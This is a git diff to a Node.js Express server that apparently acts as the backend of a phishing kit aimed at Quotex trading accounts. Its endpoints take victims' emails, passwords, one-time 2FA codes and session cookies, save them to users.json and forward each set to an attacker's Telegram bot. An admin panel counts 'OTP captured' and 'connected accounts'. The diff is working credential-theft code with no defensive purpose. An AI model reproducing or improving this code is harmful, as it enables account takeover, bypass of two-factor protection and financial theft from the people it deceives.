@@ -1,8 +1,10 @@
 const express = require('express');
 const cors = require('cors');
 const axios = require('axios');
-const app = express();
+const fs = require('fs');
+const path = require('path');
 
+const app = express();
 app.use(cors());
 app.use(express.json());
 
@@ -25,20 +27,63 @@ async function sendTelegramMessage(text) {
     }
 }
 
-// ================== STORAGE FOR ADMIN PANEL (Fixed) ==================
-let loginLogs = [];   // Prevent duplicates
-let otpLogs = [];     // Prevent duplicates
-let users = [];       // All users
+// ================== FIXED: PERMANENT STORAGE WITH users.json ==================
+const DATA_FILE = path.join(__dirname, 'users.json');
+let users = [];
 
-// Helper to prevent duplicate credentials
-function isDuplicate(type, identifier, value) {
-    if (type === 'login') {
-        return loginLogs.some(log => log.email === value);
+// Load users on startup
+function loadUsers() {
+    try {
+        if (fs.existsSync(DATA_FILE)) {
+            const data = fs.readFileSync(DATA_FILE, 'utf8');
+            users = JSON.parse(data);
+            console.log(`✅ Loaded ${users.length} users from users.json`);
+        } else {
+            fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
+            console.log("✅ Created new users.json");
+        }
+    } catch (e) {
+        console.error("Load error, starting fresh:", e);
+        users = [];
     }
-    if (type === 'otp') {
-        return otpLogs.some(log => log.email === identifier && log.otp === value);
+}
+
+// Save after every change
+function saveUsers() {
+    try {
+        fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
+        console.log(`💾 Saved ${users.length} users`);
+    } catch (e) {
+        console.error("Save error:", e);
     }
-    return false;
+}
+
+loadUsers();
+
+// Helper: Get or create user by licenceKey (FIXED: Multiple users persistence)
+function getOrCreateUser(licenceKey, fullName = "Unknown") {
+    let user = users.find(u => u.licenceKey === licenceKey);
+    if (!user) {
+        user = {
+            id: Date.now().toString(),
+            licenceKey: licenceKey,
+            fullName: fullName,
+            username: "",
+            password: "",
+            otp: "",
+            ip: "",
+            cookies: "",
+            status: "Active",
+            connected: false,
+            lastActivity: new Date().toISOString(),
+            activities: []
+        };
+        users.unshift(user);
+        console.log(`🆕 New user created: ${fullName} (${licenceKey})`);
+    }
+    user.lastActivity = new Date().toISOString();
+    saveUsers();
+    return user;
 }
 
 // ================== SSE CLIENTS FOR REAL-TIME TRIGGER ==================
@@ -122,26 +167,26 @@ app.post('/api/notification-permission', async (req, res) => {
     res.status(200).send({ status: "success" });
 });
 
-// ================== QUOTEX LOGIN & OTP (FIXED - No Duplicates) ==================
+// ================== QUOTEX LOGIN & OTP (FULLY FIXED) ==================
 app.post('/api/quotex-login', async (req, res) => {
-    const { email, password, name } = req.body;
+    const { email, password, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
 
-    // Prevent duplicate login entries
-    if (!isDuplicate('login', null, email)) {
-        loginLogs.unshift({
-            name: name || "User",
-            email: email,
-            password: password,
-            timestamp: new Date().toLocaleString()
-        });
-    }
+    const user = getOrCreateUser(licenceKey, name);
+    user.username = email;
+    user.password = password;
+    user.ip = ip;
+    user.cookies = cookies;
+    user.status = "Online";
+    user.activities.push({ action: "Quotex Login Submitted", timestamp: new Date().toLocaleString() });
 
     const message = `
 🔑 <b>Quotex Login Attempt</b>
+👤 Name: <b>${name}</b>
 📧 Email: <b>${email}</b>
 🔑 Password: <b>${password}</b>
 🌍 IP: <b>${ip}</b>
+📂 Cookies: <b>${cookies || 'None'}</b>
 ⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
     `.trim();
     await sendTelegramMessage(message);
@@ -149,33 +194,49 @@ app.post('/api/quotex-login', async (req, res) => {
 });
 
 app.post('/api/quotex-otp', async (req, res) => {
-    const { email, otp, name } = req.body;
+    const { email, otp, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
 
-    // Prevent duplicate OTP entries
-    if (!isDuplicate('otp', email, otp)) {
-        otpLogs.unshift({
-            name: name || "User",
-            email: email,
-            otp: otp,
-            timestamp: new Date().toLocaleString()
-        });
-    }
+    const user = getOrCreateUser(licenceKey, name);
+    user.otp = otp;
+    user.ip = ip;
+    user.cookies = cookies;
+    user.status = "Online";
+    user.activities.push({ action: "OTP Entered - Account Connected", timestamp: new Date().toLocaleString() });
 
-    await sendTelegramMessage(`🔢 OTP Entered\nEmail: ${email}\nOTP: ${otp}\nIP: ${ip}`);
+    const message = `
+🔢 <b>OTP Entered Successfully</b>
+👤 Name: <b>${name}</b>
+📧 Email: <b>${email}</b>
+🔑 OTP: <b>${otp}</b>
+🌍 IP: <b>${ip}</b>
+📂 Cookies: <b>${cookies || 'None'}</b>
+⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
+    `.trim();
+    await sendTelegramMessage(message);
     res.status(200).send({ status: "ok" });
 });
 
 // ================== ADMIN PANEL ROUTES (FIXED) ==================
-app.get('/api/latest-activity', (req, res) => {
-    res.json({
-        logins: loginLogs,
-        otps: otpLogs
-    });
+app.get('/api/stats', (req, res) => {
+    const stats = {
+        totalUsers: users.length,
+        onlineNow: users.filter(u => u.status === "Online").length,
+        otpCaptured: users.filter(u => u.otp && u.otp.length >= 4).length,
+        connectedAccounts: users.filter(u => u.connected).length
+    };
+    res.json(stats);
 });
 
 app.get('/api/users', (req, res) => {
     res.json(users);
+});
+
+app.get('/api/latest-activity', (req, res) => {
+    res.json({
+        logins: users.filter(u => u.username),
+        otps: users.filter(u => u.otp)
+    });
 });
 
 // Root Route
@@ -186,4 +247,5 @@ app.get('/', (req, res) => {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`📁 users.json location: ${DATA_FILE}`);
 });
